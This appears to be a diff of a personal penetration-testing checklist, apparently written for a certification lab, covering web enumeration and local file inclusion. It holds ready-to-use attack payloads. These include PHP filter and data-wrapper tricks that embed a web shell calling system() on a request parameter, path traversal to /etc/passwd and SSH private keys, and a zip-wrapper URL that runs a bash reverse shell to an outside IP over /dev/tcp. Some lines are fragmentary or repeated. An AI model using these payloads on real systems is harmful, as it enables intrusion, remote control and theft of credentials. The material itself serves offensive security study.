@@ -513,20 +513,32 @@ Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
 # HTTP/HTTPS(80,8080,8000,443...)
 ## HTTP Checklist
 - Run feroxbuster?
+    - └─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.193.231/ -C 404,401,403 -x php,aspx,asp,jsp
+- Run gobuster?
+    - 
 - Check every directory and file?
 - LFI OR Local File Inclusion (ex. http://192.168.249.12/index.php?page=somepage.php)
-  - Can you upload reverse shell through other user?
-  - Can you find SSH keys?
+  
+- PHP wrapper(LFI)
   - php://filter/convert.base64-encode/resource=index
   - php://filter/convert.base64-encode/resource=index.php
         - When we want to decrypt base64: echo "blahblahblahblah..." | base64 -d
-  - data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
-  - data://text/plain,<?php%20echo%20system('ls');?>
-  - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-  - http://192.168.173.229/index?file=zip://uploads/upload_1705500922.zip%23rev
-  - ## GETTING reverse shell through zipfile...?!
-      - http://192.168.173.229/index.php?file=zip://uploads/upload_1708042099.zip%23simple-backdoor&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F443%200%3E%261%22
-- File Traversal (ex. /home/someone/.ssh/id_rsa?)
+-Data wrapper(LFI)
+    - data://text/plain,<?php%20echo%20system('ls');?> # without encoding
+      
+    - echo -n '<?php echo system($_GET["cmd"]);?>' | base64  #PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+    - data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+    
+- Zip wrapper(LFI)
+    - http://192.168.173.229/index?file=zip://uploads/upload_1705500922.zip%23rev
+    - http://192.168.173.229/index.php?file=zip://uploads/upload_1708042099.zip%23simple-backdoor&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F443%200%3E%261%22
+- File Traversal
+    - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    - /home/someone/.ssh/id_rsa
+    - /home/someone/.ssh/
+    - /home/someone/.ssh/
+    - /home/someone/.ssh/
+    - /home/someone/.ssh/
 - Find CMS and its version?
 - SQLi?
 
